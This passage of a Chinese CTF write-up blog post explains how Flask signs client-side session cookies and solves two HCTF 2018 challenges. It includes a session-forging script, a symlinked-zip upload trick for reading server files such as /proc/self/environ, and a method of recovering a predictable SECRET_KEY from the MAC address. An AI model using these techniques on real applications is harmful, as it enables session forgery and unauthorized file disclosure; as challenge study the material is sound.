+<p>这里的loads部分使用TimestampSigner来对传入的数据进行解析，查看TimestampSinger中关于签名与反签名的源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Signs the given string and also attaches a time information."""</span></span><br><span class="line"> value = want_bytes(value)</span><br><span class="line">    timestamp = base64_encode(int_to_bytes(self.get_timestamp()))</span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line">    value = value + sep + timestamp</span><br><span class="line">    <span class="keyword">return</span> value + sep + self.get_signature(value)</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">unsign</span><span class="params">(self, value, max_age=None, return_timestamp=False)</span>:</span></span><br><span class="line">    <span class="string">"""Works like the regular :meth:`~Signer.unsign` but can also</span></span><br><span class="line"><span class="string">    validate the time.  See the base docstring of the class for</span></span><br><span class="line"><span class="string">    the general behavior.  If `return_timestamp` is set to `True`</span></span><br><span class="line"><span class="string">    the timestamp of the signature will be returned as naive</span></span><br><span class="line"><span class="string">    :class:`datetime.datetime` object in UTC.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = Signer.unsign(self, value)</span><br><span class="line">        sig_error = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">except</span> BadSignature <span class="keyword">as</span> e:</span><br><span class="line">        sig_error = e</span><br><span class="line">        result = e.payload <span class="keyword">or</span> <span class="string">b''</span></span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If there is no timestamp in the result there is something</span></span><br><span class="line">    <span class="comment"># seriously wrong.  In case there was a signature error, we raise</span></span><br><span class="line">    <span class="comment"># that one directly, otherwise we have a weird situation in which</span></span><br><span class="line">    <span class="comment"># we shouldn't have come except someone uses a time-based serializer</span></span><br><span class="line">    <span class="comment"># on non-timestamp data, so catch that.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sep <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> sig_error:</span><br><span class="line">            <span class="keyword">raise</span> sig_error</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(<span class="string">'timestamp missing'</span>, payload=result)</span><br><span class="line"></span><br><span class="line">    value, timestamp = result.rsplit(sep, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        timestamp = bytes_to_int(base64_decode(timestamp))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        timestamp = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Signature is *not* okay.  Raise a proper error now that we have</span></span><br><span class="line">    <span class="comment"># split the value and the timestamp.</span></span><br><span class="line">    <span class="keyword">if</span> sig_error <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(text_type(sig_error), payload=value,</span><br><span class="line">                               date_signed=timestamp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Signature was okay but the timestamp is actually not there or</span></span><br><span class="line">    <span class="comment"># malformed.  Should not happen, but well.  We handle it nonetheless</span></span><br><span class="line">    <span class="comment">#检查timestamp</span></span><br><span class="line">    <span class="keyword">if</span> timestamp <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> BadTimeSignature(<span class="string">'Malformed timestamp'</span>, payload=value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check timestamp is not older than max_age</span></span><br><span class="line">    <span class="keyword">if</span> max_age <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        age = self.get_timestamp() - timestamp</span><br><span class="line">        <span class="keyword">if</span> age &gt; max_age:</span><br><span class="line">            <span class="keyword">raise</span> SignatureExpired(</span><br><span class="line">                <span class="string">'Signature age %s &gt; %s seconds'</span> % (age, max_age),</span><br><span class="line">                payload=value,</span><br><span class="line">                date_signed=self.timestamp_to_datetime(timestamp))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> return_timestamp:</span><br><span class="line">        <span class="keyword">return</span> value, self.timestamp_to_datetime(timestamp)</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure></p>
+<p>unsigin过程直接调用父类Signer的unsign,再进行timestamp的检查，由于之前调用时传入了max_age所以会检查timestamp是否超时（当时没注意到这一点一直以为随便一个timestamp就可以结果gg了。。。）</p>
+<h3 id="序列化与反序列化的总结"><a href="#序列化与反序列化的总结" class="headerlink" title="序列化与反序列化的总结"></a>序列化与反序列化的总结</h3><p>最后经过flask处理的字符串的格式为：</p>
+<p>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</p>
+<p>对于以上的调用我们可以总结为这样的代码(与服务器上的python版本无关，如果不确定服务器运行环境timestamp最好根据服务器反馈获取)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">'*******'</span></span><br><span class="line">salt=<span class="string">"cookie-session"</span></span><br><span class="line">serializer=session_json_serializer</span><br><span class="line">digest_method=hashlib.sha1</span><br><span class="line">key_derivation=<span class="string">'hmac'</span></span><br><span class="line"></span><br><span class="line">signer_kwargs = dict(</span><br><span class="line">            key_derivation=key_derivation,</span><br><span class="line">            digest_method=digest_method</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(obj,timestamp,sep)</span>:</span></span><br><span class="line">        my_serializer=URLSafeTimedSerializer(key,salt=salt,serializer=serializer,signer_kwargs=signer_kwargs)</span><br><span class="line">        base64d=my_serializer.dump_payload(obj) <span class="comment">#数据压缩</span></span><br><span class="line">        data=base64d+sep+timestamp <span class="comment">#拼接timestamp</span></span><br><span class="line">        result=data+sep+my_serializer.make_signer(salt).get_signature(data) <span class="comment">#拼接签名内容</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
+<p>而从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码，解码可以使用phith0n师傅的payload：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></p>
+<p>需要特别注意的是<strong>python2与python3下产生的timestamp是不一样的！！！</strong>当时被这个问题坑了很久。。。</p>
+<h2 id="hctf两道题目的wp"><a href="#hctf两道题目的wp" class="headerlink" title="hctf两道题目的wp"></a>hctf两道题目的wp</h2><p>有了以上的分析要解决hctf的这两道题目就很容易了：</p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p><a href="http://admin.2018.hctf.io/index" target="_blank" rel="noopener">http://admin.2018.hctf.io/index</a></p>
+<p>这道题目我们能做出来是因为在github上搜索hctf,按照recent updated得到了题目的repo<a href="https://github.com/woadsl1234/hctf_flask" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask</a></p>
+<p>repo中暴露了私钥信息,而且题目只需要能用admin用户登入即可，因此可以直接使用上面的脚本跑出admin用户的session来。</p>
+<h3 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h3><p><a href="http://hideandseek.2018.hctf.io/" target="_blank" rel="noopener">http://hideandseek.2018.hctf.io/</a></p>
+<p>这道题目中登入后会要求我们上传一个zip文件,如果zip文件内的所有文件都是文本文件便可以成功返回文件的内容。<br>然而zip文件中也可以包含软链接,采用<code>zip -ry out.zip link</code>即可将一个软链接打包到out.zip中。因此我们可以尝试上传包含<code>/proc/self/environ</code>软链接的压缩包来获取一些运行环境信息<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/environ link</span><br><span class="line">zip -ry out.zip link</span><br></pre></td></tr></table></figure></p>
+<p>上传后可以获得当前一些环境信息：<br><a href="https://p5.ssl.qhimg.com/t016318fbef2298a371.png" target="_blank" rel="noopener">png1</a><br>可以发现uwsgi配置文件的路径<code>/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini</code>,尝试读取配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure></p>
+<p>可以得知当前脚本为<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code><br>从而获取到源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="keyword">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="keyword">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure></p>
+<p>然而并无法获取flag.py的源码，因为限制了内容不能包含hctf。<br>尝试获取<code>/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html</code><br>可以得知只要能用admin登入即可获得flag.</p>
+<p>这里我们重点查看payload中SECRET_KEY的生成方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+<p>可以看到随机数的种子为<code>uuid.getnode()</code>.而<code>uuid.getnode()</code>函数返回的便是当前网卡的mac地址。那么要怎样获取服务器上的网卡地址?<br>这里便可以通过linux强大的特殊文件系统来获取。首先利用之前的方法读取<code>/proc/net/dev</code>可以发现服务器上的所有网卡。可以发现服务器只有eth0和lo两个网卡。之后再读取<code>/sys/class/net/eth0/address</code><br>即可获取eth0网卡的mac地址。获取了地址，我们便获取了SECRET_KEY，之后便可以使用我们上面的payload来伪造session从二获取flag。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>通过这次hctf深入的了解了flask的客户端session的生成过程，可以说hctf相比最近的一些神仙大战确实是异常很适合web狗的比赛了。每年的hctf都能学到一些东西，希望以后能多一些这样干货满满的比赛。○|￣|_<br>ps:如果出一道改了源码改了默认salt和签名机制的题目会不会被打死ヾ(≧∇≦*)ゝ</p>
+
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" <i class="fa fa-tag">Writeup</a>
+          
+            <a href="/tags/CTF/" <i class="fa fa-tag">CTF</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/CTF/Writeup/SUS十一欢乐赛-writeup/" rel="next" title="SUS十一欢乐赛 writeup">
+                <i class="fa fa-chevron-left"></i> SUS十一欢乐赛 writeup
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/CTF/Writeup/SUCTF招新赛官方writeup/" rel="prev" title="SUCTF招新赛官方writeup">
+                SUCTF招新赛官方writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/logo.jpg" alt="Susers">
+          <p class="site-author-name" itemprop="name">Susers</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-name">Posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">Tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/susers" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.bxsteam.xyz/" title="BXS Team" target="_blank">BXS Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://asuri.org/" title="Asuri Team" target="_blank">Asuri Team</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://github.com/SEU-ITE/" title="SEU-ITE" target="_blank">SEU-ITE</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask对客户端session的处理机制"><span class="nav-number">1.</span> <span class="nav-text">flask对客户端session的处理机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化"><span class="nav-number">1.1.</span> <span class="nav-text">序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#序列化与反序列化的总结"><span class="nav-number">1.3.</span> <span class="nav-text">序列化与反序列化的总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hctf两道题目的wp"><span class="nav-number">2.</span> <span class="nav-text">hctf两道题目的wp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#admin"><span class="nav-number">2.1.</span> <span class="nav-text">admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hide-and-seek"><span class="nav-number">2.2.</span> <span class="nav-text">hide and seek</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Susers</span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</span></div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">全站共31.0k字</span>
+</div>
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+  
